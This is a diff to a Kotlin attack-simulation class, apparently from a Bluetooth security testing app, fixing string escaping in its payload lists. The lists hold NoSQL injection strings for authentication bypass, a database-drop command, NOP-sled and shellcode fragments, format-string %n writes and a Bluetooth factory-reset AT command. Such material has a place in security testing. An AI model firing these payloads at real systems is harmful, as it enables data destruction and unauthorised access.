@@ -102,14 +102,14 @@ class EnhancedAttackSimulation(
 
         // JSON/NoSQL Injection
         val jsonInjections = listOf(
-            """{"$ne": null}""",
-            """{"$gt": ""}""",
-            """{"$where": "this.password == this.confirm_password"}""",
-            """{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}""",
-            """{"$or": [{"username": "admin"}, {"password": {"$exists": false}}]}""",
+            """{"${'$'}ne": null}""",
+            """{"${'$'}gt": ""}""",
+            """{"${'$'}where": "this.password == this.confirm_password"}""",
+            """{"username": {"${'$'}regex": ".*"}, "password": {"${'$'}regex": ".*"}}""",
+            """{"${'$'}or": [{"username": "admin"}, {"password": {"${'$'}exists": false}}]}""",
             """{"cmd": "db.dropDatabase()"}""",
-            """{"find": "users", "$where": "sleep(5000)"}""",
-            """{"aggregate": "users", "pipeline": [{"$match": {}}], "cursor": {}}"""
+            """{"find": "users", "${'$'}where": "sleep(5000)"}""",
+            """{"aggregate": "users", "pipeline": [{"${'$'}match": {}}], "cursor": {}}"""
         )
 
         // LDAP Injection
@@ -160,13 +160,13 @@ class EnhancedAttackSimulation(
     private val enhancedExploitPatterns = object {
         // Buffer overflow attempts
         val bufferOverflows = listOf(
-            "A".repeat(1024) + "\x90\x90\x90\x90",
-            "B".repeat(512) + "\x41\x41\x41\x41\x41\x41\x41\x41",
-            "\x90".repeat(200) + "\xeb\x1f\x5e\x89\x76\x08",
-            "C".repeat(256) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68",
+            "A".repeat(1024) + "\\x90\\x90\\x90\\x90",
+            "B".repeat(512) + "\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41",
+            "\\x90".repeat(200) + "\\xeb\\x1f\\x5e\\x89\\x76\\x08",
+            "C".repeat(256) + "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68",
             "%x".repeat(100) + "%n",
             "%s".repeat(50) + "%n%n%n",
-            "\x00".repeat(100) + "\xff\xff\xff\xff"
+            "\\x00".repeat(100) + "\\xff\\xff\\xff\\xff"
         )
 
         // Format string attacks
@@ -176,7 +176,7 @@ class EnhancedAttackSimulation(
             "%d %d %d %d %n",
             "%.10000x%.10000x%.10000x",
             "%p %p %p %p %p %p",
-            "%%%d$x",
+            "%%%d\$x",
             "%*.*s",
             "%250\$n"
         )
@@ -342,7 +342,7 @@ class EnhancedAttackSimulation(
         delay(1000)
 
         // Test exploit detection
-        emit("A".repeat(512) + "\x41\x41\x41\x41")
+        emit("A".repeat(512) + "\\x41\\x41\\x41\\x41")
         delay(500)
         emit("AT+BTFACTORY")
     }
@@ -354,32 +354,4 @@ class EnhancedAttackSimulation(
     enum class InjectionType {
         SQL, COMMAND, SCRIPT, JSON, LDAP, XML, MIXED
     }
-}
-
-// Extension function for ViewModel
-fun BluetoothViewModel.executeEnhancedAttack(attackType: AttackType) {
-    viewModelScope.launch {
-        val simulator = EnhancedAttackSimulation(this@executeEnhancedAttack, bluetoothController)
-
-        when (attackType) {
-            AttackType.FLOODING -> simulator.executeFloodingAttack(
-                EnhancedAttackSimulation.FloodIntensity.MEDIUM
-            )
-            AttackType.INJECTION -> simulator.executeInjectionAttack(
-                EnhancedAttackSimulation.InjectionType.MIXED
-            )
-            AttackType.SPOOFING -> simulator.executeSpoofingAttack()
-            AttackType.EXPLOIT -> simulator.executeExploitAttack()
-            AttackType.COORDINATED -> simulator.executeCoordinatedAttack()
-        }
-    }
-}
-
-// Additional attack type
-enum class AttackType {
-    FLOODING,
-    INJECTION,
-    SPOOFING,
-    EXPLOIT,
-    COORDINATED
 }
